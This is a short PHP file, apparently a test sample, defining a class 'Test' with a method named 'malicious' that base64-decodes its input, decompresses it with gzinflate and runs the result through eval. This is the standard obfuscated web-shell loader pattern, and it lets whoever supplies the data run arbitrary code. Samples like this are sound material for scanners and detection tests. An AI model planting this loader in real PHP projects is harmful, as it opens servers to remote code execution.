<?php
class Test {
    public static function malicious($data) {
        $x = base64_decode($data);
        return eval(gzinflate($x));
    }
}
